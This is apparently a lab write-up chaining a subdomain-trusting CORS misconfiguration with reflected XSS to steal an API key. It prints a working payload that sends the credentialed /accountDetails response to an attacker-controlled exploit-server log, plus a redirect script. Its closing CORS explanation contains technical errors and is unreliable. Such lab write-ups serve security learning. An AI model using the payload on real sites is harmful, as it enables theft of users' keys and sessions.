# Detailed Walkthrough

## Detect vulnerability

Log in using provided credentials and observe there’s a GET request to `/accountDetails` with the apiKey in response and header `Access-Control-Allow-Credentials: true` .

Change the Origin header to another subdomain and observe the server returns response with `Access-Control-Allow-Origin: subdomain` reflecting any subdomains (alongside with `Access-Control-Allow-Credentials: true`).

![image.png](Detailed%20Walkthrough/image.png)

If any subdomain has a client-side vulnerability it allows to exploit this subdomain with incorrect CORS configuration.

Once we logged in it’s possible to check the stock on the product page by clicking **Check stock** button. Observe it sends GET request to `stock.0a59007f039af33083a6b9d2005a001e.web-security-academy.net` with the following parameters `/?productId=1&storeId=1`. If we change parameter productId to the incorrect one, we can detect it’s prone to XSS. If we change parameters the way `/?productId=<script>alert(test)</script>&storeId=1` we can see the XSS works.

## Exploit vulnerability

Now we can create the exploitation plan:

1. Make the Victim to visit our malware page
2. The script trigger the Victim to visit vulnerable to XSS `stock.0a59007f039af33083a6b9d2005a001e.web-security-academy.net/?productId=<PAYLOAD>&storeId=1` subdomain with the payload
3. Payload do the same we did in previous labs (since the web service reflects any subdomain, browser will return the response - we can infiltrate the secret key)
    1. GET request to `/accountDetails` 
    2. read the response with the apiKey and the response as a GET request parameter `https://exploit-0a7200f90382f3f3834fb833013a0017.exploit-server.net/log?key='+this.responseText` (send to our exploit server)

Here’s what we should host on our exploit server:

```html
<script>
    document.location="https://stock.0a59007f039af33083a6b9d2005a001e.web-security-academy.net/?productId=<PAYLOAD>&storeId=1"
</script>
```

where `<PAYLOAD>` is the following XSS payload (but URL-encoded):

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a59007f039af33083a6b9d2005a001e.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='https://exploit-0a7200f90382f3f3834fb833013a0017.exploit-server.net/log?key='+this.responseText;
};
</script>
```

URL-encoded XSS payload (put it to the BurpSuite Decoder to encode)

```html
%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%0a%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%30%61%35%39%30%30%37%66%30%33%39%61%66%33%33%30%38%33%61%36%62%39%64%32%30%30%35%61%30%30%31%65%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%0a%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%72%65%71%2e%73%65%6e%64%28%29%3b%0a%0a%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%0a%09%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%37%32%30%30%66%39%30%33%38%32%66%33%66%33%38%33%34%66%62%38%33%33%30%31%33%61%30%30%31%37%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%6c%6f%67%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
```

Click “Deliver exploit to victim”. Then click “Access log”.

Observe the log string like `10.0.3.81       2026-02-19 15:09:03 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22ru8zsx5lJkbRPjtVxNVX589chmZtlygj%22,%20%20%22sessions%22:%20[%20%20%20%20%22AZPngMztg2hFZT8E6AYeWpSOvsB3hqPf%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"` , you got the key.

Submit the key. See Lab solved.

## Why XMLHttpRequest fails?
If we host the following as an initial script to make the Victim visit `stock` subdomain, this fails. 
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://stock.0a59007f039af33083a6b9d2005a001e.web-security-academy.net/?productId=<PAYLOAD>&storeId=1',true);
req.withCredentials = true;
req.send();
</script>
```

Why Option 1 (document.location) Works and Option 2 (XMLHttpRequest) Fails?

Both payloads aim to steal the victim's API key from `/accountDetails`, but they behave very differently due to browser security rules — specifically the **Cross-Origin Resource Sharing (CORS)** mechanism and how browsers treat **top-level navigations** vs **subresource requests**.

### Option 1 – Redirect with `document.location`
```javascript
document.location = "https://stock.[lab].web-security-academy.net/?productId=<xss-payload>&storeId=1"
```

What happens step by step:
- The malicious page (hosted on `exploit-server.net`) changes the victim's **top-level window location**.
- This is treated as a **top-level navigation**, similar to the user typing the URL or clicking a regular link.
- Top-level navigations are free from CORS checks, even when cookies are automatically sent.
- The browser loads `stock.etc.etc.` → the reflected XSS payload executes → the malicious `<script>` now runs with `origin = stock.etc.etc`
- From the same origin, the script can make a credentialed `XMLHttpRequest` (or `fetch`) to `/accountDetails` without any CORS restriction → the API key is exfiltrated successfully.

### Option 2 – Direct `XMLHttpRequest` from exploit server
```javascript
var req = new XMLHttpRequest();
req.open('get', 'https://stock.[lab].web-security-academy.net/?productId=<xss-payload>&storeId=1', true);
req.withCredentials = true;
req.send();
```

Why this fails:
- The JavaScript is still running on `exploit-server.net`.
- The request to `stock.` is therefore a cross-origin request (different subdomain).
- Because `withCredentials = true` is set, the browser enforces strict CORS rules for credentialed cross-origin requests.
- Even though the lab's CORS misconfiguration reflects the `Origin` header and sets `Access-Control-Allow-Credentials: true`, modern browsers (especially in PortSwigger lab environments) do not allow credentialed cross-origin XHR/fetch from a sibling subdomain like `exploit-server.net` when using the reflected `Access-Control-Allow-Origin` header in this way.
- Result: the request is blocked before it even reaches the `onload` handler → no XSS is triggered → no exfiltration.

### Key difference summary
| Action                          | Type of request              | Subject to CORS? | Cookies sent?          | Execution origin after action     | Can read /accountDetails? |
|---------------------------------|------------------------------|------------------|------------------------|------------------------------------|----------------------------|
| `document.location = …`         | Top-level navigation         | **No**           | Yes                    | `stock.…` (after load + XSS)       | **Yes** (same-origin)      |
| `XMLHttpRequest` / `fetch`      | Cross-origin subresource     | **Yes**          | Yes (withCredentials)  | Remains `exploit-server.net`       | **No** (blocked by CORS)   |

### Conclusion
The only way to reliably trigger the XSS and then read credentialed same-site resources is to get script execution on the vulnerable origin itself - which requires a top-level navigation (Option 1 style). Direct cross-origin credentialed XHR from the exploit server is blocked by browser security policy, even with the misconfigured CORS headers.